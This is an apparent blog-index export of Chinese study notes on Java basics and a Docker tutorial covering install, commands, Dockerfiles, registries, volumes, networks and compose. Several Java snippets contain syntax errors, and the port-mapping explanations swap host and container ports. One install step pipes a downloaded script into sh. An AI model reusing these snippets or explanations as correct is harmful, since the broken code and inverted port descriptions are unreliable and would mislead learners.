}\nif判断\n根据条件来执行或者不执行某段语句，基本语法例如：\nif（条件）{ // 当条件满足时执行的语句 }else{ // 当条件不满足时执行的语句 }\n例如： if(a\u0026gt;=100){ System.out.println(\u0026ldquo;a大于或者等于100\u0026rdquo;); }else{ System.out.println(\u0026ldquo;a不大于或者等于100\u0026rdquo;); }\nswitch判断\n根据表达式的结果来执行相对应的语句，例如：\nswitch(a){ case 1: System.out.println(\u0026ldquo;a等于1\u0026rdquo;); break; case 2: System.out.println(\u0026ldquo;a等于2\u0026rdquo;); break; default: System.out.println(\u0026ldquo;不知道a等于多少\u0026rdquo;); }\nswitch也可以匹配字符串\nwhile循环\n循环就是根据条件进行循环处理，当条件满足时循环处理，当条件不满足时退出循环\n例如：\nwhile (a\u0026gt;=100){ System.out.println(a); a++; } while循环是先判断后循环处理，当初始条件不满足时，那么一次循环都不会发生\ndo\u0026hellip;while就是先执行再判断条件，例如：\ndo{ System.out.println(a); a++; }while (a\u0026gt;=100);\n先执行do里面的语句，再判断条件是否满足，所以do\u0026hellip;while最低也会执行一次，哪怕初始条件也是不满足的\nfor循环\nfor和while不一样，它是使用计数器（自增或者自减）来实现循环，例如：\nfor (int a=1;a\u0026lt;=100;a++){ system.out.println(a); }\nfor可以用于数组遍历\nbreak语句用于退出当前循环\ncontinue语句用于提前结束本次循环，直接执行下次循环\n例如：\nfor (int a=1;a\u0026lt;=100;a++){ system.out.println(a); if(a==2){ break; } if(a==3){ continue; }\n数组\n数组的定义及遍历\nint[] arr = {5,1,3,7,8,2,6,0,10,4,9};\nfor (int i=0;i\u0026lt;arr.length;i++){ system.out.println(arr[i]); }\n循环遍历的另一种方式\nfor(int a:b){ System.out.println(a); }\n数组的每一个元素都可以通过索引来访问，数组的索引是从0开始，例如数组的第一个元素，就是arr[0]，通过for循环，当i不小于时停止循环，i为索引值，arr.length为该数组的长度，从而达到输出数组的元素\nint[] arr = {5,1,3,7,8,2,6,0,10,4,9};\nfor (int i;arr){ system.out.println(i); }\ni:arr方法可以让变量i拿到arr数组的元素，而不是通过索引获取arr数组的值\n多维数组的定义及遍历\nInt[][] arr={{1,4,6},{,3,5,7},{9,2,2}};\nfor (int i=0;i\u0026lt;arr.length;i++){ for(int r=0;r\u0026lt;arr[i].length;r++){ system.out.println(arr[i][r]);\n} }\n通过for嵌套，达到遍历二维数组及多维数组\n数组的排序\n冒泡排序\nint[] arr = {5,1,3,7,8,2,6,0,10,4,9};\nfor (int i=0;i\u0026lt;arr.length-1;i++){ for(int r=0;r\u0026lt;arr.length-i-1;r++){ if(arr[r]\u0026gt;arr[r+1]{ int a = arr[r]; arr[r]=arr[r+1]; arr[r+1] =a; ) } } system.out.println(Arrays.toString(arr));\n通过循环，将相邻的数的位置互换，最大的数被换到末尾，对数组的排序是会修改数组本身，最好新建个数组，将数组的元素放入新的数组里，操作新的数组\narraycopy(被复制的数组,从被复制数组中复制数组的开始位置,需要复制的目标数组,复制到目标的数组的开始位置,复制的长度)\n二维数组\nint a[][] = new int[][]{ {1,2,3}, {9,8,7} };\nint a[][] = new int[9][8]; # 有9个一维数组，每个一维数组的长度为8，\na[3][6]=88; # 可以直接访问已经定义好的数组，并且赋值\n众所周知，java是一门面对对象的语言\n面向对象的实现是继承性和多态性\n面向对象的概念是方法，类，实例\n面对对象基础\n类是实例的构造，类是实例模板，定义了创建实例的方法，实例是根据类创建\n定义类\nclass Hallo{ public int a; public String b; public double c; }\n一个类可以包含字段，字段用于描述类的特征，这里定义了三个字段，分别是int类型的，命名为a，string类型的，命名为b，double类型的，命名为c，通过将这一组数据放在一个对象上，达到数据封装\n创建实例\nHallo abc = new Hallo();\n建立一个Hallo类的实例，通过变量abc指向该实例，Hallo abc是定义Hallo类型的变量abc，new Hallo()才是创建Hallo实例\n实例可以通过变量.字段方法来访问到实例变量，例如：\nGo maina = new Go(); maina.a = 18; maina.b =\u0026ldquo;hallo\u0026rdquo;; maina.c = 1.2; System.out.println(maina.b);\n}\r}\nclass Go { public int a; public String b; public double c; }\n注意：在不同的实例中定义的变量，即便变量名相同，但是在内存中，是不同的，互不干扰，可以理解为局部变量的意思\n并不建议在实例中直接操作字段，这样会破坏封装性\n方法\n使用private修饰的字段，外部程序是不能访问这些字段的，为了处理这个问题，需要用到方法来间接处理这些字段\nGo maina = new Go(); maina.setA(18); maina.setB(\u0026ldquo;hallo\u0026rdquo;); System.out.println(maina.getA()+maina.getB); } } class Go { private int a; private String b;\npublic int getA(){\rreturn this.a;\r}\rpublic void setA(int a) {\rthis.a = a;\r}\rpublic String getB(){\rreturn this.b;\r}\rpublic void setB(String b) {\rthis.b = b;\r}\r}\n外部程序通过调用方法getA()和getB()来间接修改字段\n一个类通过定义方法，应该给外部程序提供可以操作的api，也要保证内部的逻辑性\n调用方法：实例.方法(参数);\nprivate方法\n该方法不允许外部调用，主要是在内部方法调用\npublic class hallo { public static void main(String[] args) { go oo = new go(); oo.setAge(2002); System.out.println(oo.getAge());\n}\r} class go{ private String name; private int age;\npublic void setAge(int age){\rthis.age = age;\r}\rpublic int getAge(){\rreturn abc(2020);\r}\rprivate int abc(int xyz){\rreturn xyz - this.age;\r}\r}\nabc() 就是一个private方法\nthis变量\n在方法内部，有一个变量this，这个变量始终指向当前的实例，例如this.age\n一般来说，命名没有冲突，可以省略this，但是如果字段同名或者有局部变量，那么必须要加上this\n方法参数\n方法可以提供0个或者任意个参数，方法参数用于提供变量给方法 例如 class hallo{ public void abc(int age, String name){}\n参数必须要符合个数要求和数据类型要求\npackage包\npackage hallo; # 声明该类处在那个包中\nimport hallo.yes; # 导入类中需要的类(用来导入其他包的类)\n访问修饰符\n修饰符有四种：\nprivate # 私有的\npackage/friendly/default # 不可写的\nprotected # 受保护的\npublic # 公共的\n例如：public String yes;\n类与类之间的关系\n继承：指一个类继承另一个类的功能，来增加本身的功能\n实现：指一个类实现接口功能，是类和接口之间最常见的关系\n依赖：指一个类使用了另一个类，而依赖于另一个类，另一个类发生改变有可能导致影响当前类\n关联：和依赖关系类似，不过是更强的依赖关系，关联关系可以单向关联，也可以双向关联\n聚合：和关联关系类似，不过整体和部分可以分离，有独自的生命周期\n组合：和关联关系类似，不过整体和部分不可以分离，整体的生命周期结束后那么部分的生命周期也结束了\nprivate：本身可以访问，但是不能继承类，不能访问同包下的类和其他包下的类\npackage/friendly/default ：本身可以访问，同包下的类可以继承，不同包下的类不能继承，可以访问同包下的类，不能访问不同包下的类\nprotected：本身可以访问，同包下的类可以继承，不同包下的类可以继承，可以访问同包下的类，不能访问不同包下的类\npublic：本身可以访问，同包下的类可以继承，不同包下的类可以继承，可以访问同包下的类，可以访问不同包下的类\n访问修饰符一般用来封装，将每一个类的作用明确化\n实例属性和类属性\n当一个属性声明为类属性，那么所有的对象都可以使用这个值，例如：\npublic class Untitled {\rpublic String name; // 对象属性\rstatic String yes; // 类属性\rpublic static void main(String[] args) {\rUntitled main = new Untitled();\rmain.name = \u0026quot;yes\u0026quot;;\rUntitled.yes = \u0026quot;gg\u0026quot;;\rSystem.out.println(main.name);\rSystem.out.println(main.yes);\rUntitled max = new Untitled();\rmax.name = \u0026quot;no\u0026quot;;\rSystem.out.println(max.name); System.out.println(max.yes);\r}\r}\r输出yes，gg，no，gg\n可以通过main.yes和UntUntitled.yes来访问类属性\n只有当一个类的所有对象的某个值都相同时，可以使用类属性\n当一个类的对象的某个值不同时，使用实例属性，让这个值可以根据对象的不同来自定义\n类方法和实例方法\n实例方法必须要有对象才能调用，但是类方法可以直接通过类来调用，不需要对象的存在\n例如：\npublic class Untitled {\rpublic String name; protected String yes;\rpublic void hallo(){\ryes = \u0026quot;hallo word\u0026quot;;\rSystem.out.println(yes);\r}\rpublic static void name() {\rSystem.out.println(\u0026quot;hallo java\u0026quot;);\r}\rpublic static void main(String[] args) {\rUntitled main = new Untitled();\rmain.hallo();\rUntitled.name();\r}\r}\r可以通过main.name()或者UntUntitled.name()来调用类方法\n如果在一个方法中调用了对象属性，那么使用实例方法，如果在一个方法中没有调用任何对象属性，那么使用类方法\njava输出中文乱码，可能是javac读取java文件使用的字符集错误\njavac -encoding utf-8 *.java\njava已放弃学习，主打golang和Python了（java又臭又长，快来加入golang教吧）\n","permalink":"https://99999.fun/posts/19/","summary":"java基于java虚拟机（Java Virtual Machine，JVM）和java应用编程接口（Application Programming Interface，API）构成\njava的跨平台得益于java虚拟机，只需要编译一次java程序，就可以在不同系统的java虚拟机上运行\njava编译成字节流，java虚拟机通过解析这些字节流来做的跨平台，编译完成得到的字节流可以在不同平台的java虚拟机上跑\njava分为Java SE、Java EE 和 Java ME。\n类的命名：必须是英文开头，后可字母，数字和下划线\n一般为大写字母开头\n例如：\npublic class Abc\npublic是访问修饰符，表示该class为公开，如果没有写pulic，也可以正常编译，但是这个class将不能在命令行中执行\n在class内部可以定义方法，例如:\npublic static void main(String[] args){}\n这个例子的方法名为main，返回值为void，表示没有返回值，空\nstatic是一个关键字，同样也是修饰符，表示静态方法\njava入口程序必须是静态方法，方法名也必须为main，参数必须为String数组\n在方法内部，语句才能执行，每一行程序都必须要以分号结束;\n// 单行注释\n/*\n多行注释\n*/\n/** *\n一样是多行注释 * */ java的变量的类型和JavaScript一样，变量分两种，基本类型变量和引用类型变量 java有8种基础类型，分别是整型（4种），字符型（1种），浮点型（2种），布尔型（1种）\n变量必须先定义，后赋值使用，例如：\nint a = 1;\n定义为int整数类型，名称为a，初始值为1\n变量的特点就是可以重新赋值\nint i = 1; // 定义int类型，名称为i，赋值为1\ni = 100; // 重新赋值为100\nint x = i; // 变量x的值为i，因为i的值为100，所以x的值为i\n整型\n整型类型：int，byte，short，long\n整型类型的数就是整数，整数默认为int，在数值后加上L就代表为long，例如：long abc = 123L;","title":"JAVA基础学习笔记"},{"content":"docker是一个应用容器，可以将应用以及该应用的依赖打包到一个可以移植的容器中，应用在这个容器中运行\n可以进行转移，修改，版本管理等操作，不用担心应用转移到别的服务器会出现依赖问题\n将容器文件转移到别的服务器上，不会影响到容器，一次配置，可以在多个服务器上使用相同的环境\n在以前，根本不可能实现或者保障一个服务器是运行多个应用，直到虚拟机的出现，虚拟机可以让空闲的服务器部署新的应用，但是虚拟机依赖于操作系统，操作系统又会占用CPU和内存，以及存储，而且虚拟机的移植性差启动缓慢，直到容器的出现\n运行在相同的宿主机的容器是共享一个操作系统的，而且容器具备启动快，移植性强的特点（不用担心本地运行好好的，到生产环境就出一堆问题）\ndocker的多数项目和工具是使用golang编写的\nDocker容器技术高度依赖于Linux内核，不管是在windwos或者Mac OS上都不是真正的容器化（只有在Linux系统上才能实现无虚拟化的真正容器化），都是在虚拟化Linux之后，在Linux虚拟机的基础上实现的\nDocker三大件：镜像，容器，仓库\n镜像被用来创建容器（而且镜像文件是复用，只可读的）\n容器是镜像文件的实例，容器与容器之间是隔离的，容器可被启动，查看，暂停，退出，重启，删除\n仓库是集中存储镜像文件的地方，Docker官方仓库：https://hub.docker.com/\nDocker官网文档：https://docs.docker.com/\nDocker是基于C/S架构（Client-Server）的系统，Docker的守护进程（Docker Daemon）运行在服务端上，客户端通过Docker Client和守护进程建立通信，守护进程可以接收客户端发送的指令并且可以管理服务端的容器\nDocker Engine（引擎）会执行客户端发送的指令，来执行Docker内部的工作，每一项工作以Job的形式存在（一个job表示一个工作任务）\n如果job（工作任务）需要镜像时，会从Docker Registry中下载获取镜像（如果本地存在则从本地获取，如果没有再从远程仓库获取）\n当Docker容器需要创建网络环境时，通过Network driver创建并且配置Docker容器网络环境（通过网桥来暴露对外的端口和ip）\n如果需要限制Docker容器运行资源或者执行用户指令时，通过Exec driver完成\n网络的配置以及Exec driver的实现都是通过Libcontainer来实现的，Libcontainer是用来管理容器的包，该包基于go语言开发的，像创建容器，删除容器等等都可通过Libcontainer完成\n安装docker（环境为ubuntu20.04）\n如果之前安装过docker，需要先卸载\nsudo apt remove docker docker-engine docker.io containerd runc\ndocker官方推荐使用docker的存储库来安装或者升级，而不是通过脚本或者通过下载deb软件的方式来安装\n安装依赖\nsudo apt install ca-certificates curl gnupg lsb-release\n配置docker官方的GPG密钥\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg \u0026ndash;dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg\n配置稳定Docker CE源\nsudo add-apt-repository \u0026ldquo;deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian $(lsb_release -cs) stable\u0026rdquo;\n安装docker引擎\nsudo apt install docker-ce docker-ce-cli containerd.io\n或者直接使用docker官方提供的sh脚本\ncurl -s https://get.docker.com | sh （不推荐使用）\n如果需要安装指定版本的docker，可指定docker-ce和docker-ce-cli的版本\n查看源仓库中可安装的docker的版本\napt-cache madison docker-ce\n启动docker服务\nservice docker start\n关闭docker服务\nservice docker stop\n重启docker服务\nservice docker restart\n检查是否安装成功（创建一个测试容器，并且执行该容器，该容器会返回信息并且退出）\nsudo docker run hello-world\n或者docker version\n查看所有镜像\ndocker image ls或者docker images\n查看所有容器\ndocker ps\ndocker ps -a # 输出所有容器（包括未运行的）\ndocker ps -q # 只输出容器id\ndocker ps -a -q # 输出所有容器id\ndocker ps -n 5 # 输出最近创建的5个容器\ndocker ps -l # 显示最近创建的容器\nREPOSITORY：镜像名称，TAG：镜像的标签（一般为该镜像的版本号），IMAGE ID：镜像id，CREATED：镜像创建时间，SIZE：镜像大小\n镜像id实质上为该镜像的sha256\n注意：如果不指定版本，将默认使用latest版本的镜像\ndocker system df # 查看Docker的磁盘使用情况\ndocker stop 容器id（或者容器名都可以） -f # 关闭指定容器，-f为强制删除\ndocker stop $(docker ps -a -q) # 关闭所有容器\n删除指定容器\ndocker image rm 容器名称 # 例如 docker image rm centos\ndocker rmi 容器id # 删除指定镜像\ndocker rmi $(docker images -a -q) # 删除所有镜像\n查看所有正在运行的容器\ndocker container ls或者docker ps\n查看所有的容器（包括已经停止运行的）\ndocker container ls \u0026ndash;all\n运行指定容器\ndocker container run 镜像名\n或者\ndocker run 镜像名\n启动容器\ndocker start 容器ID或者容器名\n重启容器\ndocker restart 容器ID或者容器名\n停止容器\ndocker stop 容器ID或者容器名\n强制停止运行容器\ndocker kill 容器ID或者容器名\n删除已经停止运行的容器\ndocker rm 容器ID\n注意：rm是删除容器，rmi是删除镜像\ndocker exec -it 容器ID bash # 在容器中打开新终端，并且启动新的进程，在这个情况下使用exit退出不会导致容器的暂停，而attach会导致容器的暂停，推荐使用exec\ndocker attach 容器ID # 直接进入容器启动命令的终端，不启动新的进程\ndocker run -it ubuntu /bin/bash # i表示以交互模式运行容器，t为给容器创建一个伪终端（搭配使用就是交互式容器）\ndocker run \u0026ndash;name=\u0026ldquo;容器的新名称\u0026rdquo; 镜像名 # 为容器指定新名称，如果不指定，容器名称默认为镜像名\ndocker run -d 镜像名 # 后台运行容器并且返回容器id（以守护进程的方式后台运行容器）\ndocker run -p 80:8080 镜像名 # 运行并且映射指定容器的80端口到物理机的8080端口\ndocker run -P 镜像名 # 随机端口映射，不常用\n获取容器（从镜像源（docker hub）中下载到本地，docker提供大量已经配置好的容器，可以直接下载使用，修改）\ndocker image pull 镜像名 # 拉取某个镜像\ndocker search 镜像名 # 搜索查找某个镜像\nNAME：容器仓库名称，DESCRIPTION：容器描述，STARS：类似github的star，关注，喜欢 OFFICIAL：是否为官方，AUTOMATED：是否为自动构建\ndocker cp 容器id:容器内部的路径 目标主机的路径 # 将容器的文件备份（拷贝）到主机中\n导出导入容器（备份容器）\ndocker export 容器id \u0026gt; 文件x.tar # 导出容器\ncar 文件x.tar | docker import - 镜像用户/镜像名:镜像版本号 # 导入容器\n修改容器源\n国内容器源\nhttp://hub-mirror.c.163.com # 网易云\nhttps://docker.mirrors.ustc.edu.cn # 中国科技大学\nhttps://mirror.ccs.tencentyun.com # 腾讯云\ndocker run hello-world \u0026ndash;registry-mirror=https://mirror.ccs.tencentyun.com 容器名 # 只对当前指令起作用\n找到/etc/default/docker 插入\nDOCKER_OPTS=\u0026quot;\u0026ndash;registry-mirror=https://mirror.ccs.tencentyun.com\u0026quot;\n或者\n找到/etc/docker/daemon.json，插入\n{\u0026ldquo;registry-mirrors\u0026rdquo;: [\u0026ldquo;https://mirror.ccs.tencentyun.com\u0026rdquo;]} # 可以插入多个源\n然后重启服务\n如果dockerhub满足不了，可以在hub已存在的容器中进行修改（安装，卸载\u0026hellip;）\n或者使用Dockerfile，从零开始构建容器\nmkdir hallo \u0026amp;\u0026amp; cd hallo # 新建一个文件夹，并且进入这个文件夹\nnano Dockerfile # 新建个文件，并且修改它\nFROM ubuntu:18.04 RUN apt -y update \u0026amp;\u0026amp; apt install -y nginx \u0026amp;\u0026amp; apt install -y mariadb-server \u0026amp;\u0026amp; apt install -y php*\nFROM：基础镜像,操作都是基于这个基础镜像，RUM：执行指定指令（shell）\n其他参数，MAINTAINER：容器创建者，CMD：当容器启动时执行命令，只能有一条CMD命令，多条执行最后一条，容器run命令会覆盖cmd命令\nENTRYPOINT：当容器启动时执行命令，不可覆盖\nUSER：指定哪个用户来启动容器\nEXPOSE：容器内部开启端口，一般用于容器端口映射到主机端口上\nENV：环境变量\nADD：复制或者下载到容器，请确保本地或者docker仓库中有需要add的文件，例如：\nADD 文件路径（或者url） 目标容器的绝对路径\nVOLUME：切换目录用，类似cd\n打包容器\ndocker build -t 容器名 .\n这个“.”表示为当前路径\n如果正在运行docker，想退出可以使用ctrl+D，例如\n在centos中体验Ubuntu系统\n例如docker container run -it ubuntu bash\n如果想退出docker，可以在docker（run进去的容器）中输入exit\n如果想docker中的容器不停止， 快捷键 ctrl+p+q\n推送本地容器到docker仓库中\n首先需要一个docker仓库账号，例如https://hub.docker.com/或者https://cr.console.aliyun.com/cn-hangzhou/new # 阿里容器镜像服务，\ndocker login -u 账号 -p 密码 # 登录DockerHub账号\ndocker push hallo_word:yes\ndocker pull会默认推送带有latest标签的容器到本地，所以推荐把容器标签修改为latest，或者直接指定要推送哪个容器，精确到标签\ndocker tag hallo_word:yes hallo_word:latest\n推送到第三方仓库（例如：阿里容器镜像服务）\ndocker pull registry.cn-hangzhou.aliyuncs.com/xxx/xxx:latest # 推送容器到本地\ndocker login \u0026ndash;username=xxx@qq.com registry.cn-hangzhou.aliyuncs.com # 登录的用户名为阿里云账号全名，密码为开通服务时设置的密码，如果是私有仓库，那么需要推送容器到本地之前执行，推送容器到本地之后再执行一次\ndocker tag 容器id registry.cn-hangzhou.aliyuncs.com/xxx/xxx:latest # 推送到阿里容器仓库\n端口映射（实质上并不是docker容器技术实现的，是利用了iptables）\ndocker配置文件hostconfig.json\ndocker run -d -p 8000:80 ubuntu // 将容器的8000端口映射到宿主机上的80端口\ndocker为啥比虚拟机性能好\ndocker不需要硬件资源的虚拟化，docker的容器的软件是可以直接使用物理机的硬件资源的（更好的利用硬件资源），而且docker是直接调用的宿主机的内核，不需要重新加载操作系统的OS内核（减少不必要的浪费）\n虚悬镜像（dangling image）：指的是仓库名，标签都是的镜像，一般出现在删除镜像出错时\n查找虚悬镜像\ndocker image ls -f dangling=true\n删除虚悬镜像\ndocker image prune #删除所有dangling image\n镜像是一种独立，可执行，轻量级的软件包，包含某个软件需要的所有内容，这个镜像包含应用程序，应用的配置依赖，这个镜像实质上就是一个可交付的运行环境\n镜像分层系统实现依赖于UnionFS\nUnionFS（联合文件系统）：是一种分层，轻量级的高性能文件系统，支持对文件系统的修改作为一次提交来一层一层的叠加，并且将不同的目录挂载到同一个虚拟文件系统下\n镜像可通过分层来基于基础镜像来制造各种应用镜像\nDocker镜像加载原理：通过UnionFS来一层一层组成，bootfs（boot file system）加载和引导内核，当boot加载完毕，内存使用权从bootfs转交到内核，系统卸载bootfs\nrootfs（root file system）就是操作系统，包含Linux系统中标准的/bin，/etc等目录\nDocker镜像为啥这么小的原因就是镜像只包含bootfs和rootfs，复用宿主机的内核\n镜像分层的好处：可复用，方便共享（复制迁移）资源，镜像的每一层都可以被共享，可复用\n镜像层是只读，容器层是可写的，当一个容器被启动，一个可写层被加载到镜像的顶部时，那么这一层被叫为容器层，容器层之下的都被叫为镜像层\ncommit命令提交副本来创建新镜像\ndocker commit -m=\u0026ldquo;注释\u0026rdquo; -a=\u0026ldquo;作者\u0026rdquo; 容器id 用户/镜像名:镜像版本号\n搭建私有仓库\ndocker私有仓库（Docker Registry）\nDocker Registry是docker提供的镜像，专门用来构建docker私有仓库\ndocker pull registry # 拉取Registry镜像\ndocker run -d -p 5000:5000 -v /test/registry/:/tmp/registry \u0026ndash; privileged=true registry\n默认情况下，仓库被创建在容器的/var/lib/registry目录下（当然也可以通过容器卷来映射）\ndocker tag ubuntu 192.168.1.110:5000/ubuntu # 修改tag为符合私有仓库的规范\n这个私有仓库默认不支持http推送，需要修改/etc/docker/daemon.json\n\u0026ldquo;insecure-registries\u0026rdquo;: [\u0026ldquo;192.168.1.110:5000\u0026rdquo;]\n如果不生效，请重启docker服务\n推送镜像到私有仓库\ndocker push 192.168.1.110:5000/ubuntu\n查看私有仓库存储的镜像\ncurl -XGET http://192.168.1.110:5000/v2/_catalog\n获取私有仓库镜像到本地\ndocker pull 192.168.1.110:5000/ubuntu\n容器数据卷\n-v参数为启动自定义容器数据卷\n比如说docker run -d -p 5000:5000 -v /test/registry/:/tmp/registry \u0026ndash; privileged=true registry\n/test/registry/为宿主机路径，/tmp/registry为容器内部路径，\u0026ndash; privileged=true为开启privileged，（开启privileged后，容器内部的root才拥有真正的root权限，否则容器的root只是普通用户权限）\n容器数据卷用于数据的持久化（独立于容器的生命周期），可绕过联合文件系统来达到持续存在或者共享数据的目的，docker不会在删除容器时，删除容器挂载的数据卷，数据卷指定容器内部路径，任何在该路径存储的数据，都会被映射到宿主机指定的那个目录下\n在数据卷中的任何更改都不会认为是镜像的更新，而且数据卷中的更改是实时生效的（不需要重启容器之类的，哪怕容器没有启动），数据卷的生命周期长（可持续到没有容器使用它为止）\n数据卷被用于容器和宿主机之间的互通互联，在宿主机中更新的文件，会实时在容器中生效\ndocker inspect 镜像名或者镜像id # 获取容器/镜像的元数据\n数据卷在该镜像的元数据的Mounts属性中找到\n数据卷默认可读可写（rw），可通过ro来限制容器内部只能读，不能写\n默认情况下\ndocker run -d -p 5000:5000 -v /test/registry/:/tmp/registry:rw \u0026ndash; privileged=true registry\n因为rw是默认的，可以省略不写\n限制容器只能读取数据卷，不能写（ro，read only）\ndocker run -d -p 5000:5000 -v /test/registry/:/tmp/registry:ro \u0026ndash; privileged=true registry\n数据卷的继承（\u0026ndash;volumes-from）\ndocker run -it \u0026ndash; privileged=true \u0026ndash;volumes-from 容器1 \u0026ndash;name 容器2 registry\n容器2继承容器1的数据卷规则（哪怕容器1被删除了或者停止运行了，依然不会影响到容器2的数据卷）\ndocker network\ndocker network可用于容器之间的互联以及通信（端口映射），可通过服务名来直接通信（不受IP变动而影响）\ndocker会默认创建一个叫docker0的虚拟网桥（bridge网络模式）\ndocker0网桥会在内核层连通其他网络网卡和虚拟网卡，实现所有的容器和本地主机的网络连接（同一个物理网络）\ndocker会默认创建三个网络模式，分别为bridge（默认），host，none\n可通过docker network ls命令查看\n创建网络\ndocker network create hallo\n删除网络\ndocker network rm hallo\n查看网络的详细信息\ndocker network inspect bridge\nbridge网络模式：为容器分配和设置IP，并且将容器分配到docker0网桥（如果不指定-network，创建的容器默认在该模式上）（\u0026ndash;network bridge，可忽略）\nhost网络模式：容器不会虚拟网卡，而是直接使用宿主机的ip和端口和外界通信（不需要额外进行NAT转换，没有独立的Network namespace，而是和宿主机共用一个Network namespace）（\u0026ndash;network host）\nnone网络模式：该模式的容器有自己的独立网络规则（Network namespace），但是没有进行配置，需要手动配置docker容器网络（发挥网络定制功能，没有虚拟网卡，没有IP等等网络信息），在该模式下只有一个127.0.0.1的本地网络回环接口（lo）（\u0026ndash;network none）\ncontainer网络模式：该模式下的容器不会配置自己的IP，而是和指定的容器共享IP和端口范围（网络共用，文件和进程隔离）（\u0026ndash;network container:指定容器名或者容器ID）\n自定义网络模式（可通过服务名（容器名/主机名）来通信，docker network create hallo）\ndocker-compose容器编排\ndocker-Compose是Docker官方提供的Docker容器集群快速编排工具，用于管理多个docker容器组成的应用，通过docker-compose.yml配置文件来管理多个容器之间的调用关系\n官方文档https://docs.docker.com/compose/\n下载文档：https://docs.docker.com/compose/install/\n下载docker-Compose sudo curl -L \u0026ldquo;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\u0026rdquo; -o /usr/local/bin/docker-compose\n添加写的权限 sudo chmod +x /usr/local/bin/docker-compose\n测试是否安装完成 docker-compose \u0026ndash;version\n构建并且启动容器（执行docker-compose.yml配置文件）（加参数-d为启动服务并且后台运行） docker-compose up\n构建或者重新构建服务 docker-compose build\n删除指定服务的容器 docker-compose rm 容器名\n停止并且删除容器，镜像，网络，卷 docker-compose down\n进入容器 docker-compose exec 服务id\n查看当前docker-compose编排的全部容器 docker-compose top\n查看当前docker-compose编排的容器进程 docker-compose ps\n停止docker-compose服务 docker-compose stop\n启动docker-compose服务 docker-compose start\n重启docker-compose服务 docker-compose restart\n检查配置文件（-q参数表示当配置文件出现问题时才输出信息） docker-compose config\n容器的7种状态：\ncreated（已创建） restarting（重启中） running或up（运行中） removing（迁移中） paused（暂停） exited（停止） dead（死亡）\ndocker-compose.yml配置文件\nversion: \u0026quot;3.9\u0026quot;\rservices:\rweb:\rbuild:\rcontext: . dockerfile: Dockerfile_test\rports:\r- \u0026quot;5000:5000\u0026quot;\rvolumes:\r- /app/test:/data/app\rlinks:\r- redis\rnetworks:\r- hallo_net\rredis:\rimage: redis\rcommand: redis-server /etc/redis/redis.conf\rnetworks:\rhallo_net:\rversion字段为版本号（具体支持的版本和docker-compose安装的版本有关，具体看实质版本），services字端表示服务容器，services字端下面的服务名的image字段为从指定镜像中启动容器（镜像可本地，可仓库或者镜像ID），ports字段为端口映射，networks字段为指定网络模式，volumes字段为容器数据卷\n外面那个networks字段将会创建hallo_net自定义网络模式，处理基于指定镜像外，还可以基于Dockerfile，build字段下的dockerfile字段就是指定Dockerfile文件所在的路径，context字段为构建的路径，links字段为链接到指定服务中的容器\n一般都是通过Dockerfile自动化构建镜像，然后基于这个镜像使用docker-compose管理容器\nPortainer可视化工具\nPortainer是一个Docker轻量级的可视化工具（Portainer官网，https://www.portainer.io，官网文档：https://docs.portainer.io/v/ce-2.11/start/install/server/docker/linux）\n可直接pull Portainer的镜像来安装\ndocker pull portainer/portainer\ndocker run -d -p 8000:8000 -p 9443:9443 --name portainer \\\r--restart=always \\\r-v /var/run/docker.sock:/var/run/docker.sock \\\r-v portainer_data:/data \\\rportainer/portainer-ce:2.11.1\r启动完毕后，访问1192.168.1.110:9443/，进行设置admin用户和密码\n如果是监控本地的docker，选择local\nCAdvisor+InfluxDB+Granfana(CIG重量级容器监控)\ndocker依赖多种namespace来进行隔离（例如User Namespace，容器用户和宿主用户隔离，process id Namespace，隔离进程id，network Namespace，隔离网络设备，端口号，mount Namespace，隔离挂载等等），依赖于cgroup进行资源管理和控制（例如cpu，内存），namespace和cgroup都由自Linux内核提供\ndocker使用了6种namespace，分别是，mount namespace，uts namespace，ipc namespace，network namespace，pid namespace，user namespace\nmount Namespace：隔离不同进程的挂载数据，保证容器的挂载操作不会影响到宿主的挂载\nsudo unshare \u0026ndash;mount \u0026ndash;fork /bin/bash # 创建一个mount Namespace，使用/bin/bash进程，在该挂载任何文件，都不会作用于宿主\npid namespace是隔离进程的pid的，也就是说宿主是看不到容器的应用pid，容器也看不到宿主的pid\nsudo unshare \u0026ndash;pid \u0026ndash;fork \u0026ndash;mount-proc /bin/bash\n安全容器：容器运行在虚拟机中，具备虚拟机的安全隔离性，例如kata Container，使用guest kernel（精简了内核，专门提供给容器运行，减低资源的消耗）\n因为docker容器共享宿主内核，存在安全性，所以可使用安全容器来隔离宿主内核，安全容器的内核是完全独立于宿主的内核（虚拟化技术）\ndocker容器资源限制\ndocker run -it \u0026ndash;cpus=4 -m=8192 \u0026ndash;pids-limit=1000 ubuntu /bin/bash # 启动ubuntu镜像，使用/bin/bash作为终端，资源被设置为4核8g，并且只能创建1000个pid\ndocker stats ubuntu # 查看容器的资源使用情况\ncAdvisor是谷歌开源的容器监控工具，不但可以监控容器的资源使用情况，还可以监控宿主的资源使用情况，可查看容器的历史资源使用情况\ndocker run \\\r--volume=/:/rootfs:ro \\\r--volume=/var/run:/var/run:ro \\\r--volume=/sys:/sys:ro \\\r--volume=/var/lib/docker/:/var/lib/docker:ro \\\r--volume=/dev/disk/:/dev/disk:ro \\\r--publish=8080:8080 \\\r--detach=true \\\r--name=cadvisor \\\r--privileged \\\r--device=/dev/kmsg 